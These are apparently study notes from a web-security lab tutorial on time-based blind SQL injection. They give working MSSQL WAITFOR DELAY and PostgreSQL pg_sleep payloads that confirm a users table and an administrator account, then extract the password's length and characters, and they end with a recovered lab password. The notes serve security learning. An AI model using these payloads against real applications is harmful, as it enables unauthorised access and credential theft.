  ## Exploiting blind SQL injection by triggering time delays
  
Suppose that the application now catches database errors and handles them gracefully. Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.  
  
In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because “_SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response_". This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.  
  
**Note**: _The techniques for triggering a time delay are highly specific to the type of database being used._  
  
On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:  
<font color=ligreen>'; IF (1=2) WAITFOR DELAY '0:0:10'--  
'; IF (1=1) WAITFOR DELAY '0:0:10'--  </font>

The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second input will trigger a delay of 10 seconds, because the condition 1=1 is true.  

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:  
<font color=ligreen>'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--  
  

### Note :
There are various ways of triggering time delays within SQL queries, and different techniques apply on different types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).  
  
  
**Blind time delay attack on PostgreSQL database:**  

<font color=ligreen>'||+(select+pg_sleep(10))-- </font>//we get to know the vulnerability as well as the type of database  
//just try the query again without the comment -- if the query doesnt work  
  
  
**Blind SQL injection with time delays and information retrieval:  
**
	
`'+||(select+case+when(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users)--` //confirms that the users table exists
	
	``'+||(select+case+when(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users+where+username='administrator')-- ``//confirms that the administrator username exists on users table  

``'+||(select+case+when(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users+where+username='administrator'+and+LENGTH(password)=20)-- ``//confirms that the length of the password is 20 for the administrator username or we can user burp intruder sniper style  
  
``'+||(select+case+when(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users+where+username='administrator'+and+substring(password,1,1)>'a')-- ``//confirms that the first letter of password is greater than character ‘a’ and we can use burp intruder with cluster bomb style to brute force the 1 and ‘a’  
  
  
  
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  
\`z  w e j 6 q b i t m p g 8 l 4 b b 2 y 4`